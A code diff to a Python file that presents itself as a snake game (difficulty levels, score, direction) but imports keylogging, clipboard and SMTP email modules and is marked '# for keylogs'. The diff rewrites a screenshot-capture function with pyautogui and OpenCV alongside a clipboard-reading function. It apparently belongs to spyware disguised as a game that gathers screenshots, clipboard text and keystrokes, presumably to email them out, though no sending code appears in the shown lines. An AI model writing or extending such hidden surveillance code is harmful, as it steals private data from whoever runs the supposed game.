@@ -6,7 +6,7 @@ import time, subprocess, threading, socket
 from threading import Timer
 from datetime import datetime
 
-import keyboard, clipboard, autopy # for keylogs
+import keyboard, clipboard# for keylogs
 import smtplib
 from os.path import expanduser
 
@@ -15,6 +15,9 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 
+import pyautogui
+import numpy as np
+import cv2
 
 # Difficulty settings
 # Easy      ->  10
@@ -69,8 +72,13 @@ change_to = direction
 score = 0
 
 def take_screenshot():
-    autopy.bitmap.capture_screen().save('screengrab.png') 
-    #get contents of clipboard      
+    image = pyautogui.screenshot()
+    image = cv2.cvtColor(np.array(image),
+                     cv2.COLOR_RGB2BGR)
+   
+    # writing it to the disk using opencv
+    cv2.imwrite("screengrab.png", image)
+
 def get_clipboard():
     global text
     text = "It contains clipboard contents" + "\n" + clipboard.paste()    
